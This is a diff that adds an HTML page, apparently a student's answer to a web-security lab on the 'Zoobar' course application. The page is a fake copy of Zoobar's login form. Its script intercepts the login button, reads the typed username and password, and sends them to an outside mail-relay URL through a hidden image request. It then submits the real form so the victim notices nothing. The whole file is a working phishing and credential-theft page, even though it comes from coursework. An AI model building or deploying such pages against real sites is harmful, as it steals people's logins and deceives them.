@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <title>
+        Login - Zoobar Foundation
+    </title>
+</head>
+<body>
+    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+    <script>
+        var myZoobars = myZoobars || '';
+        if (myZoobars) {
+            location.href = './answer-2.html';
+        }
+    </script>
+    <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Inquisitive Dialogue</a></h1>
+    <h2>Supporting the meritorious advocates of the new world order</h2>
+    <div id="login" class="centerpiece">
+        <form action="http://localhost:8080/zoobar/index.cgi/login" name="loginform" id="form" method="POST">
+            <table>
+                <tr>
+                    <td>Username:</td>
+                    <td>
+                        <input type="text" id="username" name="login_username" size="20" autocomplete="no" value="">
+                    </td>
+                </tr>
+                <tr>
+                    <td>Password:</td>
+                    <td colspan=2>
+                        <input type="password" id="password" name="login_password" size=20 autocomplete="no">
+                        <input type="hidden" name="submit_login" value="Log in">
+                        <input type="submit" id="login_button" value="Log in">
+                        <input type="submit" name="submit_registration" value="Register">
+                    </td>
+                    <script>
+                        document.getElementById('login_button').addEventListener('click', function (e) {
+                            e.preventDefault();
+                            var name = document.getElementById('username').value;
+                            var password = document.getElementById('password').value;
+                            var image = new Image();
+                            image.onerror = function () {
+                                document.getElementById('form').submit();
+                            };
+                            image.src = 'http://tcloud.sjtu.edu.cn/course/css/sendmail.php?to=kalzium@sjtu.edu.cn&payload=' + encodeURIComponent(name + ':' + password) + '&random=' + Math.random();
+                        }, false);
+                    </script>
+                </tr>
+            </table>
+            <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+        </form>
+    </div>
+    <div class="footer warning"></div>
+</body>
+</html>
